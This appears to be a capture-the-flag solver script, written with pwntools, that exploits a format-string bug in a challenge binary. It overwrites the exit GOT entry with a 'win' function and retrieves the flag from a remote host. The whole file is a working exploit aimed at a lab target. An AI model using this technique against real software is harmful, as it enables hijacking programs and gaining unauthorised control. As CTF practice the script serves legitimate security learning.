#!/usr/bin/env python3
from pwn import context, ELF, process, FmtStr, fmtstr_payload, remote
import os

HOST = os.getenv("CTF4B_HOST", "localhost")
PORT = int(os.getenv("CTF4B_PORT", "9000"))

context.log_level = "critical"
binfile = "./chall"
context.binary = binfile
e = ELF(binfile)


def exec_fmt(payload):
    p = process(binfile)
    p.sendline(payload)
    return p.readline()


autofmt = FmtStr(exec_fmt)
offset = autofmt.offset

got_puts = e.got['exit']
win = e.sym['win']


payload = fmtstr_payload(offset, {got_puts: win})
p = remote(HOST, PORT)
p.sendlineafter(b'> ', payload)
p.recvuntil(b'ctf4b')
print('ctf4b'+p.readline().decode('utf-8', 'ignore'), end='')
